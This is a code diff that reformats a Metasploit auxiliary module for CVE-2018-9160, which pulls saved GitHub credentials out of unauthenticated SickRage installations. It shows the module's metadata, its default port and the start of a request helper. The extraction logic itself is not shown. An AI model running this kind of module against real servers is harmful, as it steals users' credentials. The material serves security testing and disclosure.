@@ -9,40 +9,47 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'HTTP SickRage Password Leak',
-      'Description'    => %q{
-        SickRage < v2018-09-03 allows an attacker to view a user's saved Github credentials in HTTP
-        responses unless the user has set login information for SickRage.
+    super(
+      update_info(
+        info,
+        'Name' => 'HTTP SickRage Password Leak',
+        'Description' => %q{
+          SickRage < v2018-09-03 allows an attacker to view a user's saved Github credentials in HTTP
+          responses unless the user has set login information for SickRage.
 
-        By default, SickRage does not require login information for the installation.
-      },
-      'Author'         =>
-      [
-        'Sven Fassbender', # EDB POC
-        'Shelby Pace'     # Metasploit Module
-      ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+          By default, SickRage does not require login information for the installation.
+        },
+        'Author' => [
+          'Sven Fassbender', # EDB POC
+          'Shelby Pace' # Metasploit Module
+        ],
+        'License' => MSF_LICENSE,
+        'References' => [
           ['CVE', '2018-9160'],
           ['EDB', '44545']
         ],
-      'DisclosureDate' => '2018-03-08'
-    ))
+        'DisclosureDate' => '2018-03-08',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
-    [
-      OptString.new('TARGETURI', [true, 'Optional path that gets prepended to the default paths to be searched', '/']),
-      Opt::RPORT(8081)
-    ])
+      [
+        OptString.new('TARGETURI', [true, 'Optional path that gets prepended to the default paths to be searched', '/']),
+        Opt::RPORT(8081)
+      ]
+    )
   end
 
   def get_config(path)
     uri = normalize_uri(target_uri.path, path)
     res = send_request_cgi(
       'method' => 'GET',
-      'uri'    => uri
+      'uri' => uri
     )
 
     # Improve this later: Add a loginscanner.
